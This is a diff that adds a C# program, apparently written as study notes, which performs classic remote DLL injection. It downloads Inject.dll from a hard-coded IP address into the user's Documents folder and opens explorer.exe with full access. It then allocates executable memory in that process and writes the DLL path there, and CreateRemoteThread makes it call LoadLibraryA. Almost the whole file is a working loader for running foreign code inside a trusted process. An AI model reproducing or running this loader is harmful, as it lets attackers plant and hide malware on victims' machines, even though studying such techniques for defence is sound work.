@@ -1,0 +1,136 @@
+using System;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Diagnostics;
+using System.Text;
+using System.IO;
+using System.Buffers;
+
+namespace DllInjection
+{
+    class Program
+    {
+
+        /*
+         HANDLE OpenProcess(
+ DWORD dwDesiredAccess,==>Read Write==> 0x001F0FFF.
+ BOOL bInheritHandle,==> a Child who can inherit this handle
+ DWORD dwProcessID==>Process ID Targeted for example explorer.exe ==>Process explorer
+ };
+        */
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
+processId);
+
+        /*
+         * LPVOID VirtualAllocEx(
+ HANDLE hProcess, ==> process Handler
+ LPVOID lpAddress,==> the desired address for the allocation of the remote process the desired allocation of the remote process in another terms(if the chosen buffer is already in use it will fail, it is better to keep it null so we have the variety to choose)
+ SIZE_T dwSize, ==> our new buffer will be allocated with starting address as supplied in lpAddress
+ DWORD flAllocationType,==> 
+ DWORD flProtect
+
+The Last 3 are the same:mirror the virtualAlloc Api Parameters and specify the size of the desired allocation , the allocation type and the memory protections
+);
+*/
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
+dwSize, uint flAllocationType, uint flProtect);
+
+        /*
+         * BOOL WriteProcessMemory(
+ HANDLE hProcess,
+ LPVOID lpBaseAddress,
+ LPCVOID lpBuffer,
+ SIZE_T nSize,
+ SIZE_T *lpNumberOfBytesWritten
+);
+*/
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        /*
+         * HANDLE CreateRemoteThread(
+ HANDLE hProcess,
+ LPSECURITY_ATTRIBUTES lpThreadAttributes,
+ SIZE_T dwStackSize,
+ LPTHREAD_START_ROUTINE lpStartAddress,
+ LPVOID lpParameter,
+ DWORD dwCreationFlags,
+ LPDWORD lpThreadId
+This API accepts seven arguments, but we will ignore those that aren’t required. The first 
+argument is the process handle to explorer.exe, followed by the desired security descriptor of the 
+new thread (lpThreadAttributes) and its allowed stack size (dwStackSize). We will set these to “0” 
+to accept the default values
+);
+*/
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
+lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
+dwCreationFlags, IntPtr lpThreadId);
+
+
+        // this Api Call is for defining the PiD we would like and target it
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,
+SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        /* 
+         * If the function succeeds, the return value is a handle to the specified module.
+         If the function fails, the return value is NULL.
+
+       < PINVOKE.net > 
+
+        HMODULE GetModuleHandleW(
+        LPCWSTR lpModuleName
+                );
+        GetModuleHandle only works for DLLs that you have loaded in the current process. 
+        Whenever the loader loads a DLL into the process, 
+        it of course maintains a data structure that includes the module's name.
+        No need to visit the file system.
+                            */
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+
+        static void Main(string[] args)
+        {
+
+            //This will put the Location as C:\Users\Administrator\Documents\
+            String loc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            //this step will take the Location mentioned above and add : Inject.Dll which is Supposed to be Injected
+            String dllname = loc + "\\Inject.dll";
+            //These 2 steps will download the DLL Mentioned above to be Located on Our Location mentioned
+            //and named as Inject.dll 
+            WebClient downloader = new WebClient();
+            downloader.DownloadFile("http://192.168.143.36/Inject.dll", dllname);
+            //our target process we will target
+            Process[] targetproc = Process.GetProcessesByName("explorer");
+            int processID = targetproc[0].Id;
+
+            //(read_write,No-Inheritance,ProcessID that we got earlier)
+            IntPtr hprocess = OpenProcess(0x001F0FFF, false, processID);
+            IntPtr addr = VirtualAllocEx(hprocess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            IntPtr outsize;
+
+
+            //The out is a keyword in C# which is used for the passing the arguments to methods
+            //as a reference type.
+            //It is generally used when a method returns multiple values.
+            Boolean res = WriteProcessMemory(hprocess, addr,
+Encoding.Default.GetBytes(dllname), dllname.Length, out outsize);
+
+            //usually there are 2 libraries: LibraryA and LibraryW , they are almost the same but 
+            //LibraryW is used for The Unicode A but they signify the same Functionality 
+            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"),
+"LoadLibraryA");
+
+            
+            IntPtr hThread = CreateRemoteThread(hprocess, IntPtr.Zero, 0, loadLib,
+addr, 0, IntPtr.Zero);
+
+        }
+    }
+}
